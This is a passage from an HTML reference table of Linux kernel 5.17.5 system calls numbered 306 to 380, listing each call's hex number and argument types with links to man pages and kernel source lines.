*tx</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/posix-timers.c#L1121">kernel&#x2F;time&#x2F;posix-timers.c:1121</a></td></tr><tr><td>306</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/syncfs.2.html">sys_syncfs</a></td><td>0x132</td><td>int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/sync.c#L149">fs&#x2F;sync.c:149</a></td></tr><tr><td>307</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendmmsg.2.html">sys_sendmmsg</a></td><td>0x133</td><td>int fd</td><td>struct mmsghdr __user *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2648">net&#x2F;socket.c:2648</a></td></tr><tr><td>308</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setns.2.html">sys_setns</a></td><td>0x134</td><td>int fd</td><td>int nstype</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/nsproxy.c#L527">kernel&#x2F;nsproxy.c:527</a></td></tr><tr><td>309</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcpu.2.html">sys_getcpu</a></td><td>0x135</td><td>unsigned __user *cpu</td><td>unsigned __user *node</td><td>struct getcpu_cache __user *cache</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L2636">kernel&#x2F;sys.c:2636</a></td></tr><tr><td>310</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_vm_readv.2.html">sys_process_vm_readv</a></td><td>0x136</td><td>pid_t pid</td><td>const struct iovec __user *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec __user *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/process_vm_access.c#L291">mm&#x2F;process_vm_access.c:291</a></td></tr><tr><td>311</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_vm_writev.2.html">sys_process_vm_writev</a></td><td>0x137</td><td>pid_t pid</td><td>const struct iovec __user *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec __user *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/process_vm_access.c#L298">mm&#x2F;process_vm_access.c:298</a></td></tr><tr><td>312</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kcmp.2.html">sys_kcmp</a></td><td>0x138</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/kcmp.c#L135">kernel&#x2F;kcmp.c:135</a></td></tr><tr><td>313</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/finit_module.2.html">sys_finit_module</a></td><td>0x139</td><td>int fd</td><td>const char __user *uargs</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/module/main.c#L2916">kernel&#x2F;module&#x2F;main.c:2916</a></td></tr><tr><td>314</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setattr.2.html">sys_sched_setattr</a></td><td>0x13a</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L7883">kernel&#x2F;sched&#x2F;core.c:7883</a></td></tr><tr><td>315</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getattr.2.html">sys_sched_getattr</a></td><td>0x13b</td><td>pid_t pid</td><td>struct sched_attr __user *attr</td><td>unsigned int size</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/core.c#L8036">kernel&#x2F;sched&#x2F;core.c:8036</a></td></tr><tr><td>316</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/renameat2.2.html">sys_renameat2</a></td><td>0x13c</td><td>int olddfd</td><td>const char __user *oldname</td><td>int newdfd</td><td>const char __user *newname</td><td>unsigned int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4960">fs&#x2F;namei.c:4960</a></td></tr><tr><td>317</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/seccomp.2.html">sys_seccomp</a></td><td>0x13d</td><td>unsigned int op</td><td>unsigned int flags</td><td>void __user *uargs</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/seccomp.c#L2007">kernel&#x2F;seccomp.c:2007</a></td></tr><tr><td>318</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrandom.2.html">sys_getrandom</a></td><td>0x13e</td><td>char __user *buf</td><td>size_t count</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/drivers/char/random.c#L1270">drivers&#x2F;char&#x2F;random.c:1270</a></td></tr><tr><td>319</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/memfd_create.2.html">sys_memfd_create</a></td><td>0x13f</td><td>const char __user *uname_ptr</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/memfd.c#L266">mm&#x2F;memfd.c:266</a></td></tr><tr><td>320</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kexec_file_load.2.html">sys_kexec_file_load</a></td><td>0x140</td><td>int kernel_fd</td><td>int initrd_fd</td><td>unsigned long cmdline_len</td><td>const char __user *cmdline_ptr</td><td>unsigned long flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/kexec_file.c#L325">kernel&#x2F;kexec_file.c:325</a></td></tr><tr><td>321</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/bpf.2.html">sys_bpf</a></td><td>0x141</td><td>int cmd</td><td>union bpf_attr *attr</td><td>unsigned int size</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/bpf/syscall.c#L5067">kernel&#x2F;bpf&#x2F;syscall.c:5067</a></td></tr><tr><td>322</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execveat.2.html">sys_execveat</a></td><td>0x142</td><td>int dfd</td><td>const char __user *filename</td><td>const char __user *const __user *argv</td><td>const char __user *const __user *envp</td><td>int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/exec.c#L2095">fs&#x2F;exec.c:2095</a></td></tr><tr><td>323</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/userfaultfd.2.html">sys_userfaultfd</a></td><td>0x143</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/userfaultfd.c#L2134">fs&#x2F;userfaultfd.c:2134</a></td></tr><tr><td>324</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/membarrier.2.html">sys_membarrier</a></td><td>0x144</td><td>int cmd</td><td>unsigned int flags</td><td>int cpu_id</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sched/membarrier.c#L579">kernel&#x2F;sched&#x2F;membarrier.c:579</a></td></tr><tr><td>325</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlock2.2.html">sys_mlock2</a></td><td>0x145</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mlock.c#L619">mm&#x2F;mlock.c:619</a></td></tr><tr><td>326</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/copy_file_range.2.html">sys_copy_file_range</a></td><td>0x146</td><td>int fd_in</td><td>loff_t __user *off_in</td><td>int fd_out</td><td>loff_t __user *off_out</td><td>size_t len</td><td>unsigned int flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1559">fs&#x2F;read_write.c:1559</a></td></tr><tr><td>327</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/preadv2.2.html">sys_preadv2</a></td><td>0x147</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1061">fs&#x2F;read_write.c:1061</a></td></tr><tr><td>328</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwritev2.2.html">sys_pwritev2</a></td><td>0x148</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>rwf_t flags</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1081">fs&#x2F;read_write.c:1081</a></td></tr><tr><td>329</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pkey_mprotect.2.html">sys_pkey_mprotect</a></td><td>0x149</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>int pkey</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mprotect.c#L824">mm&#x2F;mprotect.c:824</a></td></tr><tr><td>330</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pkey_alloc.2.html">sys_pkey_alloc</a></td><td>0x14a</td><td>unsigned long flags</td><td>unsigned long init_val</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mprotect.c#L830">mm&#x2F;mprotect.c:830</a></td></tr><tr><td>331</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pkey_free.2.html">sys_pkey_free</a></td><td>0x14b</td><td>int pkey</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mprotect.c#L860">mm&#x2F;mprotect.c:860</a></td></tr><tr><td>332</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statx.2.html">sys_statx</a></td><td>0x14c</td><td>int dfd</td><td>const char __user *path</td><td>unsigned flags</td><td>unsigned mask</td><td>struct statx __user *buffer</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L661">fs&#x2F;stat.c:661</a></td></tr><tr><td>333</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_pgetevents.2.html">sys_io_pgetevents</a></td><td>0x14d</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event __user *events</td><td>struct __kernel_timespec __user *timeout</td><td>const struct __aio_sigset *sig</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/aio.c#L2243">fs&#x2F;aio.c:2243</a></td></tr><tr><td>334</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rseq.2.html">sys_rseq</a></td><td>0x14e</td><td>struct rseq __user *rseq</td><td>uint32_t rseq_len</td><td>int flags</td><td>uint32_t sig</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/rseq.c#L336">kernel&#x2F;rseq.c:336</a></td></tr><tr><td>335</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pidfd_send_signal.2.html">sys_pidfd_send_signal</a></td><td>0x14f</td><td>int pidfd</td><td>int sig</td><td>siginfo_t __user *info</td><td>unsigned int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3846">kernel&#x2F;signal.c:3846</a></td></tr><tr><td>336</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_uring_setup.2.html">sys_io_uring_setup</a></td><td>0x150</td><td>u32 entries</td><td>struct io_uring_params __user *p</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/io_uring/io_uring.c#L3604">io_uring&#x2F;io_uring.c:3604</a></td></tr><tr><td>337</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_uring_enter.2.html">sys_io_uring_enter</a></td><td>0x151</td><td>unsigned int fd</td><td>u32 to_submit</td><td>u32 min_complete</td><td>u32 flags</td><td>const void __user *argp</td><td>size_t argsz</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/io_uring/io_uring.c#L3154">io_uring&#x2F;io_uring.c:3154</a></td></tr><tr><td>338</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_uring_register.2.html">sys_io_uring_register</a></td><td>0x152</td><td>unsigned int fd</td><td>unsigned int op</td><td>void __user *arg</td><td>unsigned int nr_args</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/io_uring/io_uring.c#L4050">io_uring&#x2F;io_uring.c:4050</a></td></tr><tr><td>339</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/open_tree.2.html">sys_open_tree</a></td><td>0x153</td><td>int dfd</td><td>const char __user *path</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L2504">fs&#x2F;namespace.c:2504</a></td></tr><tr><td>340</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/move_mount.2.html">sys_move_mount</a></td><td>0x154</td><td>int from_dfd</td><td>const char __user *from_path</td><td>int to_dfd</td><td>const char __user *to_path</td><td>unsigned int ms_flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L3765">fs&#x2F;namespace.c:3765</a></td></tr><tr><td>341</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsopen.2.html">sys_fsopen</a></td><td>0x155</td><td>const char __user *fs_name</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fsopen.c#L115">fs&#x2F;fsopen.c:115</a></td></tr><tr><td>342</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsconfig.2.html">sys_fsconfig</a></td><td>0x156</td><td>int fs_fd</td><td>unsigned int cmd</td><td>const char __user *key</td><td>const void __user *value</td><td>int aux</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fsopen.c#L314">fs&#x2F;fsopen.c:314</a></td></tr><tr><td>343</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsmount.2.html">sys_fsmount</a></td><td>0x157</td><td>int fs_fd</td><td>unsigned int flags</td><td>unsigned int ms_flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L3636">fs&#x2F;namespace.c:3636</a></td></tr><tr><td>344</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fspick.2.html">sys_fspick</a></td><td>0x158</td><td>int dfd</td><td>const char __user *path</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fsopen.c#L158">fs&#x2F;fsopen.c:158</a></td></tr><tr><td>345</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pidfd_open.2.html">sys_pidfd_open</a></td><td>0x159</td><td>pid_t pid</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/pid.c#L629">kernel&#x2F;pid.c:629</a></td></tr><tr><td>346</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clone3.2.html">sys_clone3</a></td><td>0x15a</td><td>struct clone_args __user *uargs</td><td>size_t size</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/fork.c#L2959">kernel&#x2F;fork.c:2959</a></td></tr><tr><td>347</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/close_range.2.html">sys_close_range</a></td><td>0x15b</td><td>unsigned int fd</td><td>unsigned int max_fd</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L1462">fs&#x2F;open.c:1462</a></td></tr><tr><td>348</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/openat2.2.html">sys_openat2</a></td><td>0x15c</td><td>int dfd</td><td>const char __user *filename</td><td>struct open_how *how</td><td>size_t size</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L1345">fs&#x2F;open.c:1345</a></td></tr><tr><td>349</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pidfd_getfd.2.html">sys_pidfd_getfd</a></td><td>0x15d</td><td>int pidfd</td><td>int fd</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/pid.c#L724">kernel&#x2F;pid.c:724</a></td></tr><tr><td>350</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/faccessat2.2.html">sys_faccessat2</a></td><td>0x15e</td><td>int dfd</td><td>const char __user *filename</td><td>int mode</td><td>int flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L497">fs&#x2F;open.c:497</a></td></tr><tr><td>351</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_madvise.2.html">sys_process_madvise</a></td><td>0x15f</td><td>int pidfd</td><td>const struct iovec __user *vec</td><td>size_t vlen</td><td>int behavior</td><td>unsigned int flags</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/madvise.c#L1445">mm&#x2F;madvise.c:1445</a></td></tr><tr><td>352</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_pwait2.2.html">sys_epoll_pwait2</a></td><td>0x160</td><td>int epfd</td><td>struct epoll_event __user *events</td><td>int maxevents</td><td>const struct __kernel_timespec __user *timeout</td><td>const sigset_t __user *sigmask</td><td>size_t sigsetsize</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/eventpoll.c#L2310">fs&#x2F;eventpoll.c:2310</a></td></tr><tr><td>353</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mount_setattr.2.html">sys_mount_setattr</a></td><td>0x161</td><td>int dfd</td><td>const char __user *path</td><td>unsigned int flags</td><td>struct mount_attr __user *uattr</td><td>size_t usize</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namespace.c#L4328">fs&#x2F;namespace.c:4328</a></td></tr><tr><td>354</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/quotactl_fd.2.html">sys_quotactl_fd</a></td><td>0x162</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>qid_t id</td><td>void __user *addr</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/quota/quota.c#L972">fs&#x2F;quota&#x2F;quota.c:972</a></td></tr><tr><td>355</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/landlock_create_ruleset.2.html">sys_landlock_create_ruleset</a></td><td>0x163</td><td>const struct landlock_ruleset_attr __user *attr</td><td>size_t size</td><td>__u32 flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/landlock/syscalls.c#L157">security&#x2F;landlock&#x2F;syscalls.c:157</a></td></tr><tr><td>356</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/landlock_add_rule.2.html">sys_landlock_add_rule</a></td><td>0x164</td><td>int ruleset_fd</td><td>enum landlock_rule_type rule_type</td><td>const void __user *rule_attr</td><td>__u32 flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/landlock/syscalls.c#L305">security&#x2F;landlock&#x2F;syscalls.c:305</a></td></tr><tr><td>357</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/landlock_restrict_self.2.html">sys_landlock_restrict_self</a></td><td>0x165</td><td>int ruleset_fd</td><td>__u32 flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/security/landlock/syscalls.c#L397">security&#x2F;landlock&#x2F;syscalls.c:397</a></td></tr><tr><td>358</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/memfd_secret.2.html">sys_memfd_secret</a></td><td>0x166</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/secretmem.c#L231">mm&#x2F;secretmem.c:231</a></td></tr><tr><td>359</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/process_mrelease.2.html">sys_process_mrelease</a></td><td>0x167</td><td>int pidfd</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/oom_kill.c#L1200">mm&#x2F;oom_kill.c:1200</a></td></tr><tr><td>360</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futex_waitv.2.html">sys_futex_waitv</a></td><td>0x168</td><td>struct futex_waitv *waiters</td><td>unsigned int nr_futexes</td><td>unsigned int flags</td><td>struct __kernel_timespec __user *timeout</td><td>clockid_t clockid</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/futex/syscalls.c#L246">kernel&#x2F;futex&#x2F;syscalls.c:246</a></td></tr><tr><td>361</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_mempolicy_home_node.2.html">sys_set_mempolicy_home_node</a></td><td>0x169</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long home_node</td><td>unsigned long flags</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mempolicy.c#L1487">mm&#x2F;mempolicy.c:1487</a></td></tr><tr><td>362</td><td>not implemented</td><td>0x16a</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/#L">:</a></td></tr><tr><td>363</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigaction.2.html">compat_sys_rt_sigaction</a></td><td>0x16b</td><td>int</td><td>const struct compat_sigaction __user *</td><td>struct compat_sigaction __user *</td><td>compat_size_t</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>365</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioctl.2.html">compat_sys_ioctl</a></td><td>0x16d</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>compat_ulong_t arg</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>366</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readv.2.html">sys_readv</a></td><td>0x16e</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1041">fs&#x2F;read_write.c:1041</a></td></tr><tr><td>367</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/writev.2.html">sys_writev</a></td><td>0x16f</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1047">fs&#x2F;read_write.c:1047</a></td></tr><tr><td>368</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvfrom.2.html">compat_sys_recvfrom</a></td><td>0x170</td><td>int fd</td><td>void __user *buf</td><td>compat_size_t len</td><td>unsigned flags</td><td>struct sockaddr __user *addr</td><td>int __user *addrlen</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>369</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendmsg.2.html">compat_sys_sendmsg</a></td><td>0x171</td><td>int fd</td><td>struct compat_msghdr __user *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>370</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmsg.2.html">compat_sys_recvmsg</a></td><td>0x172</td><td>int fd</td><td>struct compat_msghdr __user *msg</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>371</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">compat_sys_execve</a></td><td>0x173</td><td>const char __user *filename</td><td>const compat_uptr_t __user *argv</td><td>const compat_uptr_t __user *envp</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>372</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ptrace.2.html">compat_sys_ptrace</a></td><td>0x174</td><td>compat_long_t request</td><td>compat_long_t pid</td><td>compat_long_t addr</td><td>compat_long_t data</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>373</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigpending.2.html">compat_sys_rt_sigpending</a></td><td>0x175</td><td>compat_sigset_t __user *uset</td><td>compat_size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>374</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigtimedwait_time64.2.html">compat_sys_rt_sigtimedwait_time64</a></td><td>0x176</td><td>compat_sigset_t __user *uthese</td><td>struct compat_siginfo __user *uinfo</td><td>struct __kernel_timespec __user *uts</td><td>compat_size_t sigsetsize</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>375</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigqueueinfo.2.html">compat_sys_rt_sigqueueinfo</a></td><td>0x177</td><td>compat_pid_t pid</td><td>int sig</td><td>struct compat_siginfo __user *uinfo</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>376</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaltstack.2.html">compat_sys_sigaltstack</a></td><td>0x178</td><td>const compat_stack_t __user *uss_ptr</td><td>compat_stack_t __user *uoss_ptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>377</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_create.2.html">compat_sys_timer_create</a></td><td>0x179</td><td>clockid_t which_clock</td><td>struct compat_sigevent __user *timer_event_spec</td><td>timer_t __user *created_timer_id</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>378</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_notify.2.html">compat_sys_mq_notify</a></td><td>0x17a</td><td>mqd_t mqdes</td><td>const struct compat_sigevent __user *u_notification</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>379</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kexec_load.2.html">compat_sys_kexec_load</a></td><td>0x17b</td><td>compat_ulong_t entry</td><td>compat_ulong_t nr_segments</td><td>struct compat_kexec_segment __user *</td><td>compat_ulong_t flags</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>380</td><td><a 